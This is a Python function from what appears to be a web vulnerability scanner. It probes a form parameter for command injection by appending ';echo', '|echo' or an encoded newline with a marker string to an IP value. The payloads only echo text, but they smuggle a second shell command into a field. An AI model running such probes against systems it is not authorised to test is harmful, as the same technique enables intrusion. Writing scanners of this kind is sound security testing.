from utils.rate_limiter import rate_limited_request
import time

def test_cmdi(session, url, param, base_url=None):
    """
    Test for Command Injection vulnerability.
    
    Returns:
        dict with: vulnerable (bool), confidence (HIGH/MEDIUM/LOW), evidence (str)
    """
    
    # HIGH confidence: Echo command output appears
    payload1 = "127.0.0.1;echo cmdtest12345"
    response1 = rate_limited_request(session, "POST", url, data={param: payload1, "Submit": "Submit"})
    
    if response1 is None:
        return {"vulnerable": False, "confidence": "NONE", "evidence": "Request failed"}
    
    if "cmdtest12345" in response1.text:
        return {
            "vulnerable": True,
            "confidence": "HIGH",
            "evidence": "Command output (echo) appeared in response",
            "payload": payload1
        }
    
    # Try with different separator (for Windows or filtered semicolon)
    payload2 = "127.0.0.1|echo cmdtest67890"
    response2 = rate_limited_request(session, "POST", url, data={param: payload2, "Submit": "Submit"})
    
    if response2 and "cmdtest67890" in response2.text:
        return {
            "vulnerable": True,
            "confidence": "HIGH",
            "evidence": "Command output (pipe separator) appeared in response",
            "payload": payload2
        }
    
    # MEDIUM confidence: Try newline injection
    payload3 = "127.0.0.1%0aecho cmdtest99999"
    response3 = rate_limited_request(session, "POST", url, data={param: payload3, "Submit": "Submit"})
    
    if response3 and "cmdtest99999" in response3.text:
        return {
            "vulnerable": True,
            "confidence": "HIGH",
            "evidence": "Command output (newline separator) appeared in response",
            "payload": payload3
        }
    
    # LOW confidence: Time-based check (command takes longer)
    # This is tricky without actual timing, so we skip for simplicity
    
    return {"vulnerable": False, "confidence": "NONE", "evidence": "No command output detected"}
